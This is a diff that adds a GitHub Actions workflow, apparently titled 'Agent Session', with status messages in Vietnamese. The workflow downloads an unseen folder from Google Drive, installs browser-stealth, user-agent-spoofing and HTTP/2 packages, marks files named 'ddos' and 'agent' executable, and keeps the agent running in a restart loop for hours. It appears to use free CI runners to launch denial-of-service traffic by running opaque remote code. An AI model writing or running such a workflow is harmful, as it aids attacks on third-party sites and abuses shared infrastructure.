@@ -1,0 +1,50 @@
+name: Agent Session
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [run-tests]
+
+jobs:
+  agent-session:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    continue-on-error: true
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Install dependencies and start agent
+      run: |
+        sudo apt update -y
+        pip install gdown
+
+        echo "Downloading files from Google Drive..."
+        gdown https://drive.google.com/drive/folders/1xKpyLS3GL_nLwP3SO4k707IvhoD92mXW?usp=sharing --folder
+
+        cd k
+        npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth async axios colors hpack node-bash-title chalk@4 user-agents random-referer request
+        chmod +x ddos
+        chmod +x agent
+        ./agent
+        AGENT_PID=$!
+
+        echo ""
+        echo "╔══════════════════════════════════════════╗"
+        echo "║        ✅ Agent đang chạy!               ║"
+        echo "╠══════════════════════════════════════════╣"
+        echo "║  PID: $AGENT_PID                         ║"
+        echo "║  Session mở trong ~350 phút              ║"
+        echo "╚══════════════════════════════════════════╝"
+        echo ""
+
+        # Giữ session sống và kiểm tra agent
+        while true; do
+          if ! kill -0 $AGENT_PID 2>/dev/null; then
+            echo "Agent stopped, restarting..."
+            ./agent &
+            AGENT_PID=$!
+          fi
+          sleep 60
+        done
+      timeout-minutes: 350
